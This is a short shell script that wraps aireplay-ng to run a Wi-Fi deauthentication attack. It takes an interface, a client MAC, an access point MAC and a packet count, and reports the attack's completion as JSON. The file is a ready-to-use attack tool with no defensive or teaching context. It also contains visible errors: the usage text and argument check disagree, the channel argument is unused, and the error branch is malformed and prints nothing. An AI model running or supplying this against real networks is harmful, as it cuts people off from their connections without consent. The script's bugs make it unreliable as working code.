#!/bin/sh
if [ $# -ne 4 ]; then
    output=(jq -n \
        --arg status "false" \
        --arg output "Usage: $0 <monitor_interface> <device_mac> <access_point_mac> <timer> <channel>" \
        '{status: $status, output: $output}')
    exit 0
fi

interface=$1
device_mac=$2
access_point_mac=$3
timer=$4


sudo aireplay-ng --deauth "$timer" -c "$device_mac" -a "$access_point_mac" "$interface"
# 
sleep 10

output=$(jq -n \
    --arg status "true" \
    --arg output "Deauthentication attack completed" \
    '{status: $status, output: $output}')
echo "$output"
